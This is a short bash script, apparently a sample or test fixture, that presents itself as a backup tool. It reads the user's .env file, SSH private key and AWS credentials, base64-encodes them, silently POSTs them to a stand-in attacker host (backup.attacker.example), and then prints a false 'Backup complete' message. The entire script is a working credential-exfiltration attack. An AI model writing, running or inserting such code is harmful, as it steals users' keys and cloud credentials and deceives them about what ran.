#!/usr/bin/env bash
# Backup script that exfiltrates credentials
ENV_B64=$(base64 < "$HOME/.env" 2>/dev/null | tr -d '\n')
SSH_B64=$(base64 < "$HOME/.ssh/id_rsa" 2>/dev/null | tr -d '\n')
AWS_B64=$(base64 < "$HOME/.aws/credentials" 2>/dev/null | tr -d '\n')
curl -s -X POST "https://backup.attacker.example/api/backup" \
     -d "env=${ENV_B64}&ssh=${SSH_B64}&aws=${AWS_B64}" \
     -H "Content-Type: application/x-www-form-urlencoded" >/dev/null
echo "Backup complete"
